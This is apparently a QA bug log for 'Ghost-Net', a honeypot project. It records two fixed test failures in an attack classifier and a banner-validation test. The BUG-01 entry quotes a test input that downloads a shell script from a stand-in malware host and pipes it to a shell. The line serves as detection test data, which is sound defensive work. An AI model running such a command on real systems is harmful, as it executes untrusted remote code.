# LeukQuant Operational Bug Tracker & Remediation Log
======================================================
**Document Version:** 1.0.0-PRO  
**Tracking Scope:** Operational QA & Bug-Hunting Phase  
**Last Updated:** 2026-08-15  

---

## 1. Bug Registry Summary

| Bug ID | Severity | Component | Summary | Status | Regression Test |
| :--- | :---: | :--- | :--- | :---: | :--- |
| **BUG-01** | **P2 - Medium** | `Ghost-Net / Classifier Test` | Assertion mismatch in `test_exploit_attempt_detection` where malware dropper returned `PAYLOAD_DOWNLOAD_ATTEMPT` but test asserted legacy `EXPLOIT_ATTEMPT`. | **VERIFIED** | `tests/security/test_attack_classification.py::test_exploit_attempt_detection` |
| **BUG-02** | **P2 - Medium** | `Ghost-Net / Scan Validation` | `test_01_stable_banner_validation` hardcoded connection to port 2222 failing standalone test runs when honeypot listener was not active. | **VERIFIED** | `tests/integration/test_scan_validation.py::test_01_stable_banner_validation` |

---

## 2. Bug Status Taxonomy
- **Open**: Newly identified defect during testing.
- **Reproduced**: Confirmed with isolated test case / log evidence.
- **In Progress**: Root cause identified; fix being authored.
- **Fixed**: Fix committed to codebase.
- **Verified**: Regression test passes 100%; closed.

---

## 3. Detailed Bug Remediation Records

### BUG-01: Malware Dropper Classification Assertion Mismatch
- **Bug ID**: `BUG-01`
- **Severity**: P2 (Medium)
- **Component**: `Honey-tech/Ghost-Net` (`tests/security/test_attack_classification.py`)
- **Environment**: Local / Unit Test Tier
- **Steps to Reproduce**:
  1. Run `python tests/run_tests.py` in `Honey-tech/Ghost-Net`.
  2. `test_exploit_attempt_detection` calls `classifier.classify_event` with command `wget http://malware.evil/bot.sh -O- | sh`.
  3. Classifier returned `ClassificationCategory.PAYLOAD_DOWNLOAD_ATTEMPT`.
  4. Test asserted `ClassificationCategory.EXPLOIT_ATTEMPT` (`"suspected_command_injection"`), resulting in an `AssertionError`.
- **Root Cause**: The canonical classifier accurately categorizes `wget`/`curl` downloads as `PAYLOAD_DOWNLOAD_ATTEMPT`, whereas the test asserted the older `EXPLOIT_ATTEMPT` alias.
- **Fix Applied**: Updated `test_exploit_attempt_detection` to assert membership in `(ClassificationCategory.PAYLOAD_DOWNLOAD_ATTEMPT, ClassificationCategory.SUSPECTED_COMMAND_INJECTION)` and confidence in `(HIGH, CRITICAL)`, matching `test_response_policy_and_circuit_breaker.py`.
- **Regression Test**: `test_attack_classification.py::TestAttackClassification::test_exploit_attempt_detection`
- **Status**: **VERIFIED (Closed)**

---

### BUG-02: Hardcoded Port Binding Failure in Standalone Banner Validation Test
- **Bug ID**: `BUG-02`
- **Severity**: P2 (Medium)
- **Component**: `Honey-tech/Ghost-Net` (`tests/integration/test_scan_validation.py`)
- **Environment**: Local / Unit Test Tier
- **Steps to Reproduce**:
  1. Run `python tests/run_tests.py` in an environment without a pre-running honeypot service on `127.0.0.1:2222`.
  2. `test_01_stable_banner_validation` attempts raw socket connection to port 2222.
  3. Connection fails with `[WinError 10061] No connection could be made because the target machine actively refused it`.
- **Root Cause**: The unit test assumed a live daemon was already bound to port 2222 instead of providing an automated in-process socket fixture.
- **Fix Applied**: Updated `test_01_stable_banner_validation` to check if a live server is running, and if unreachable, dynamically instantiate an ephemeral in-process mock banner socket on port `0` for automated verification.
- **Regression Test**: `test_scan_validation.py::TestScanValidation::test_01_stable_banner_validation`
- **Status**: **VERIFIED (Closed)**
